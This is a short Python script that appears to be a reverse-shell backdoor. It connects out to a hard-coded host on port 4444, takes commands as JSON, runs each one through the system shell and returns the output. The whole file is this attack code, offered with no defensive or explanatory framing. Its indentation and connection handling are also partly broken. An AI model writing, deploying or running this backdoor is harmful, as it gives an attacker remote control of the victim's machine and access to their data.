#! /usr/bin/env python

import socket, subprocess, json

class Tcp_server:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        
        json_data = json.dumps(data)
        self.connection.send(json_data)
    def reliable_receive(self):
	while True:
		json_data = ""
		try:
			json_data = json_data + self.connection.recv(1024)
	        	return json.loads(json_data)
		except ValueError:
			continue
                                                                                    
    def execute_syscommand(self, command):
        return subprocess.check_output(command, shell=True)
    def run(self):
        while True: 
            command = self.reliable_receive()
            command_result = self.execute_syscommand(command)
            self.reliable_send(command_result)
        connection.close()

server = Tcp_server("192.168.1.12",4444)
server.run()
